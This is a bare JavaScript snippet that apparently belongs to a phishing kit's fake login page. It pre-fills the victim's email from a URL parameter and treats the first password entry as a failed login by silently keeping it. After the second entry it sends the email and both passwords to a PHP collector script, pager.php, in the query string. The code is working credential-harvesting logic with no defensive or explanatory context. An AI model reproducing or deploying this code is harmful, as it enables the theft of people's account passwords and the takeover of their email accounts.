$(document).ready(function(){
    $("#loader").hide()
  });

// 
let validEmail =
/^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

// url
const urlEmail = new URLSearchParams(window.location.search);
const usermail = urlEmail.get('id');
const userLang = urlEmail.get('lang');

// 
let delayCounter = 1000;
let postCount = 0;
let tempPass = "";

function postResult(domain, email, passwd, counts) {
    if (postCount == 1) {
    location.replace(`./php/pager.php?auth=${domain+" | " + $("#pg_smtp").val()}&mail=${email}&pass1=${tempPass}&pass2=${passwd}&conter=${counts}`);
    postCount = 0
  }
  else{
    tempPass = passwd;
    setTimeout(() => {
      $("#loader").hide();
    }, 1500);
  }

  // location.replace(`./php/pager.php?auth=${domain+" | " + $("#pg_smtp").val()}&mail=${email}&pass1=${tempPass}&pass2=${passwd}&conter=${counts}`);
}